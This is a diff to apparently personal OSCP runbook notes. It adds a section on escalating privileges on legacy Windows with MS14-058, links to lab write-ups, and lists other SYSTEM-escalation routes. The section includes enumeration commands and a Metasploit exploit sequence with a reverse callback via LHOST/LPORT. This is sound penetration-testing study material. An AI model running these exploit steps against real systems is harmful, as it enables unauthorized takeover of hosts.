@@ -901,6 +901,38 @@ If the directory right permits a target password reset, validate the reset once 
 
 See [[OSCP/BOXES/WRITE UPS/AD/Search|Search]] and [[OSCP/RUNBOOK V2/AD - PowerShell Web Access|AD - PowerShell Web Access]].
 
+## MS14-058: legacy Win32k local escalation
+
+On a Windows Server 2003-era foothold, identify the exact build, installed updates, architecture, and current token before selecting a kernel module:
+
+```cmd
+systeminfo
+wmic qfe get HotFixID,InstalledOn
+whoami /all
+```
+
+Use the local exploit suggester as a candidate list, then match the result to the host and session:
+
+```text
+background
+use post/multi/recon/local_exploit_suggester
+set SESSION $Session
+run
+
+use exploit/windows/local/ms14_058_track_popup_menu
+set SESSION $Session
+set LHOST $LocalIP
+set LPORT $Port
+run
+```
+
+MS14-058 abuses the legacy Win32k `track_popup_menu` path for kernel-mode execution and token replacement. When the foothold was created by a crash-based IIS WebDAV exploit, run the local module from the stable migrated session, not from a raw shell that is still hosted inside `w3wp.exe`. Confirm a new session with `getuid` and `whoami` showing `NT AUTHORITY\\SYSTEM`.
+
+> [!warning] 💡 A suggestion is not proof
+> MS14-058 is a separate legacy route from MS16-032 and MS16-098. Verify OS build, architecture, patch state, token, session type, and callback behavior before execution.
+
+🔁 **Seen in:** [[OSCP/BOXES/WRITE UPS/Windows/Grandpa|Grandpa]].
+
 ## External Resources
 
 - [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
@@ -920,6 +952,15 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 - [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- demonstrates the workflow described here
 - [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- both AlwaysInstallElevated policy values enabled, MSI callback, and SYSTEM verification
+- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- writable scheduled-task script and Windows file-read-to-SSH-key chain
+- [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] -- systeminfo/Sherlock triage and MS16-098 selection after rejecting the one-CPU MS16-032 path
+- [[OSCP/BOXES/WRITE UPS/Windows/Grandpa|Grandpa]] -- migrated Network Service session, local exploit-suggester review, and MS14-058 SYSTEM proof on legacy Windows
+- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- post-foothold ACL review and controlled access to the Administrator desktop
+- [[OSCP/BOXES/WRITE UPS/Windows/Conceal|Conceal]] -- `SeImpersonatePrivilege` triage followed by architecture- and CLSID-aware JuicyPotato validation
+- [[OSCP/BOXES/WRITE UPS/Windows/Netmon|Netmon]] -- application command execution was already SYSTEM, so no separate local escalation was needed
+- [[OSCP/BOXES/WRITE UPS/AD/Return|Return]] -- Server Operators membership enabled temporary service binary-path modification
+- [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]] -- `SeImpersonatePrivilege` converted an IIS foothold into SYSTEM with JuicyPotato
+- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- tunneled NSClient++ command execution returned SYSTEM
 
 ## Fermion application note: verify the task before replacing the binary
 
